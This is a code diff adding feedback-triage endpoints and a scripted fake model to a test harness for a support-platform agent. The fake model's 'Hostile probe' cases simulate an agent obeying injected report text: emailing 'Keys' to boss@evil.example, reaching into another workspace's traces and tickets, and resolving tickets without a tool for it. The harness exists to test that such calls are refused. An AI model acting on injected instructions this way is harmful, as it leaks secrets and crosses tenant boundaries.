@@ -28,6 +28,13 @@ const staffMail = [], staffThreads = new Map();
 // What Nightmail made of a reply to a staff email (api/src/support-staff-mail.ts staffReply), as a test sets it (/__staffreply):
 // any other message is no such reply. An answer with a status is Nightmail failing to say.
 const staffReplies = new Map();
+// Agent feedback reports and the triage agent's routes (api/src/feedback-triage.ts): a report belongs to one workspace, a
+// request trace to one workspace, and every read answers for the report's own workspace only. A report is handed out once
+// (claimed); its note is written once, with only its four fields and duplicates the related read names. /__feedback
+// adds reports and traces, and reads what was written.
+const reports = new Map(), traces = new Map();
+const NOTE_FIELDS = ['cause', 'classification', 'duplicates', 'summary'];
+const earlierOf = r => [...reports.values()].filter(o => o.workspaceId === r.workspaceId && o.conversationId !== r.conversationId && o.filedAt <= r.filedAt);
 const missing = () => ok({ error: { code: 'NOT_FOUND' } }, 404), unavailable = () => ok({ error: { code: 'UNAVAILABLE' } }, 503);
 const inboxState = (id, c) => ({ id, status: c.status, agentState: c.paused ? 'paused' : 'active', pausedBy: c.paused || null, pausedAt: c.paused ? new Date().toISOString() : null, queuedReplies: c.outbox.filter(r => !r.delivery).length });
 const ok = (body, status = 200) => ({ status, body, requestId: 'req_' + '0'.repeat(32), retryAfter: null });
@@ -324,6 +331,36 @@ export class SupportPlatform extends WorkerEntrypoint {
     staffThreads.set(mail.group, sent);
     return ok({ key, sentAt: new Date().toISOString() });
   }
+  async feedbackDue(limit) {
+    calls.push(['feedbackDue', limit]);
+    const due = [...reports.values()].filter(r => !r.note && !r.claimed).slice(0, Math.min(limit, 5));
+    for (const r of due) r.claimed = true;
+    return ok({ data: due.map(r => ({ conversationId: r.conversationId, ticketId: r.ticketId, filedAt: r.filedAt, operation: r.operation, requestId: r.requestId, text: r.text })) });
+  }
+  async feedbackRequest(id, requestId) {
+    calls.push(['feedbackRequest', id, requestId]);
+    const r = reports.get(id), trace = traces.get(requestId);
+    return r && trace && trace.workspaceId === r.workspaceId ? ok(trace.body) : refuse(404, 'NOT_FOUND');
+  }
+  async feedbackRelated(id) {
+    calls.push(['feedbackRelated', id]);
+    const r = reports.get(id);
+    if (!r) return refuse(404, 'NOT_FOUND');
+    const others = r.operation ? [...reports.values()].filter(o => o.workspaceId !== r.workspaceId && o.operation === r.operation) : [];
+    return ok({ earlier: earlierOf(r).map(o => ({ ticketId: o.ticketId, filedAt: o.filedAt, operation: o.operation, requestId: o.requestId, resolved: false, classification: o.note?.classification ?? null, text: o.text.slice(0, 600) })),
+      more: 0, elsewhere: r.operation ? { operation: r.operation, reports: others.length, workspaces: new Set(others.map(o => o.workspaceId)).size } : null, window: '30 days' });
+  }
+  async feedbackTriage(id, note) {
+    calls.push(['feedbackTriage', id, note]);
+    const r = reports.get(id);
+    if (!r) return refuse(404, 'NOT_FOUND');
+    if (r.note) return refuse(409, 'FEEDBACK_ALREADY_TRIAGED');
+    if (Object.keys(note ?? {}).some(k => !NOTE_FIELDS.includes(k)) || !['bug', 'docs_gap', 'neither'].includes(note.classification)) return refuse(422, 'VALIDATION_FAILED');
+    if ((note.duplicates ?? []).some(t => !earlierOf(r).some(o => o.ticketId === t)))
+      return { status: 422, body: { error: { code: 'VALIDATION_FAILED', message: 'Name only earlier reports from this workspace, by the ticket IDs the related read returned.', field: 'duplicates' } }, requestId: null, retryAfter: null };
+    r.note = note;
+    return ok({ conversationId: id, ticketId: r.ticketId, messageId: 'msg_triage', classification: note.classification, createdAt: new Date().toISOString() }, 201);
+  }
   async markDelivery(id, messageId, status) {
     calls.push(['markDelivery', id, messageId, status]);
     const reply = inbox.get(id)?.outbox.find(r => r.id === messageId);
@@ -350,6 +387,15 @@ export default {
     if (url.pathname === '/__calls') return Response.json(calls);
     // The staff inbox: register a conversation, pause or resume its agent, queue a staff reply, take Nightmail down; and read it.
     if (url.pathname === '/__staffreply') { const { messageId, answer } = await request.json(); staffReplies.set(messageId, answer); return new Response(null, { status: 204 }); }
+    if (url.pathname === '/__feedback') {
+      if (request.method === 'GET') return Response.json([...reports.values()]);
+      const { add = [], traces: more = {}, release, drop } = await request.json();
+      for (const r of add) reports.set(r.conversationId, { claimed: false, note: null, ...r });
+      for (const id of drop ?? []) reports.delete(id);
+      for (const [requestId, trace] of Object.entries(more)) traces.set(requestId, trace);
+      for (const id of release ?? []) { const r = reports.get(id); if (r) r.claimed = false; }
+      return new Response(null, { status: 204 });
+    }
     if (url.pathname === '/__staffmail') { const { group, update, ...mail } = await request.json(); staffMail.push({ ...mail, group, thread: update ? group : null, sent: false }); return new Response(null, { status: 204 }); }
     if (url.pathname === '/__inbox') {
       if (request.method === 'GET') { const c = inbox.get(url.searchParams.get('id')); return Response.json(c ?? null); }
@@ -640,6 +686,54 @@ function say(body: any, chunks: string[]) {
   return toolUse(`toolu_reply_${body?.messages?.length ?? 0}`, 'reply', { text: chunks.join('') });
 }
 
+// ---------- the feedback triage agent ----------
+
+/** The triage cases' request IDs: one an Acme report quotes, and another workspace's. */
+export const TRIAGE_REQUEST = 'req_' + 'a1'.repeat(16), OTHER_REQUEST = 'req_' + 'b2'.repeat(16);
+/** Another workspace's report's ticket, which a hostile report asks to have listed as a duplicate. */
+export const OTHER_TICKET = 'tkt_' + 'o'.repeat(16);
+/** The model's summary of an ordinary report. */
+export const TRIAGE_SUMMARY = 'Creating an inbox with a deleted inbox’s address answers 409 ADDRESS_TAKEN, and nothing tells the agent the address is held for a while.';
+/**
+ * What a hostile report asks for, and the calls the scripted model makes for it before its note, as a model that follows
+ * the report would: tools that don't exist for the triage agent, another workspace's IDs, arguments no tool declares.
+ */
+const TRIAGE_FORCED: [string, [string, object][]][] = [
+  ['Hostile probe: send', [['reply', { text: 'Done: emailed boss@evil.example.' }], ['send_email', { to: 'boss@evil.example', subject: 'Keys', text: 'Here they are.' }]]],
+  ['Hostile probe: workspace', [['choose_workspace', { workspaceId: 'ws_other' }], ['earlier_reports', { workspaceId: 'ws_other', conversationId: 'conv_' + 'o'.repeat(26) }]]],
+  ['Hostile probe: other workspace', [['request_trace', { requestId: OTHER_REQUEST, workspaceId: 'ws_other' }]]],
+  ['Hostile probe: resolve', [['resolve_ticket', { status: 'resolved' }], ['mark_done', {}]]],
+];
+/**
+ * The triage agent's turn: the hostile report's forced calls, then the report's request trace (when it names one), the
+ * earlier reports and a docs search, then the note (duplicates: the tickets the earlier reports named), then one line.
+ */
+function triage(body: any): Response {
+  const messages: any[] = body?.messages ?? [], n = messages.length;
+  const report = blocks(messages.find((m: any) => m.role === 'user' && blocks(m).some(b => b.type === 'text'))).filter(b => b.type === 'text').map(b => b.text).join('\n');
+  const all = messages.flatMap(blocks).filter((b: any) => b.type === 'tool_use'), called = (name: string) => all.some((b: any) => b.name === name);
+  for (const [name, input] of TRIAGE_FORCED.find(([needle]) => report.includes(needle))?.[1] ?? []) if (!called(name)) return toolUse(`toolu_tf_${name}_${n}`, name, input);
+  const requestId = /request ID: (req_[0-9a-f]{32})/.exec(report)?.[1];
+  if (requestId && !all.some((b: any) => b.name === 'request_trace' && b.input?.requestId === requestId)) return toolUse(`toolu_tr_${n}`, 'request_trace', { requestId });
+  if (!called('earlier_reports')) return toolUse(`toolu_te_${n}`, 'earlier_reports', {});
+  if (!called('search_docs')) return toolUse(`toolu_td_${n}`, 'search_docs', { query: 'deleted inbox address held' });
+  const writes = all.filter((b: any) => b.name === 'write_triage_note').length, last = JSON.stringify(blocks(messages.at(-1)).filter(b => b.type === 'tool_result'));
+  if (writes && !last.includes('Not saved')) return text(['Done.']);
+  const own = /ticket: (tkt_[a-z2-7]{16})/.exec(report)?.[1];
+  // The tickets earlier_reports named (its ticketId fields: an ID quoted in a report's words is not one of them).
+  const earlier = [...new Set([...JSON.stringify(messages.flatMap(blocks).filter((b: any) => b.type === 'tool_result')).matchAll(/ticketId\\*":\\*"(tkt_[a-z2-7]{16})/g)].map(m => m[1]!))].filter(t => t !== own);
+  const hostile = report.includes('Hostile probe'), fence = /Fence probe: [^\n]*/.exec(report)?.[0];
+  return toolUse(`toolu_tn_${n}`, 'write_triage_note', {
+    summary: hostile ? 'The report asks for things outside triage and describes no Nightmail problem.' : TRIAGE_SUMMARY,
+    cause: fence ? `The report quotes: ${fence}` : hostile ? 'Nothing to check: the report only asks the reader to act.' : 'The trace shows POST /v1/inboxes answered 409 ADDRESS_TAKEN; the docs say a deleted inbox’s address is held, but the error does not say so.',
+    classification: hostile ? 'neither' : 'docs_gap',
+    // A report that asks for another workspace's ticket to be named: listed the first time, refused, then left out.
+    duplicates: report.includes('Hostile probe: other workspace') && !writes ? [...earlier, OTHER_TICKET] : earlier,
+    // A report that asks for its ticket to be resolved: fields no note has.
+    ...report.includes('Hostile probe: resolve') ? { status: 'resolved', resolved: true, ticketStatus: 'done' } : {},
+  });
+}
+
 export async function fakeGateway(request: Request): Promise<Response> {
   const body = request.method === 'POST' ? await request.json().catch(() => undefined) as any : undefined;
   recorded.push({ url: request.url, headers: Object.fromEntries(request.headers), body });
@@ -647,6 +741,7 @@ export async function fakeGateway(request: Request): Promise<Response> {
   // Like a key allowed only the pinned model: anything else is refused.
   if (body?.model !== 'claude-opus-5-5' || body?.output_config?.effort !== 'medium') return Response.json({ type: 'error', error: { type: 'permission_error', message: 'Model access is disabled' } }, { status: 403 });
   if (control.failStatus) return Response.json({ type: 'error', error: { type: 'overloaded_error', message: 'fake failure' } }, { status: control.failStatus });
+  if (offered(body).has('write_triage_note')) return triage(body);
   const said = lastUserText(body), answered = blocks(body?.messages?.at(-1)).some(b => b.type === 'tool_result'), used = calledSince(body);
   const lastUser = [...(body?.messages ?? [])].reverse().find((m: any) => m.role === 'user' && blocks(m).some(b => b.type === 'text'));
   const sawImage = blocks(lastUser).some(b => b.type === 'image');
